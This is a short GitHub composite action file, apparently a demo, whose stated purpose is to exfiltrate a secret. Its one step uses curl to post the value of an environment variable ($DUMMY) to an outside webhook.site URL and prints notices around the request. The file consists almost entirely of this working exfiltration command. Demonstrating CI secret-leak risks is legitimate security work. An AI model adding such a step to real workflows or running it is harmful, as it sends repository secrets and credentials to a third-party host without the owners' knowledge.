name: 'Demo Action'
description: 'Exfiltrate secret to webhook.site'
runs:
  using: "composite"
  steps:
    - run: |
        echo "::notice ::Exfiltrating secret..."
        curl -s -d "secret=$DUMMY" https://webhook.site/1a60a52b-62aa-4e4d-bb80-12d264980aa0
        echo "::notice ::Request sent."
      shell: bash
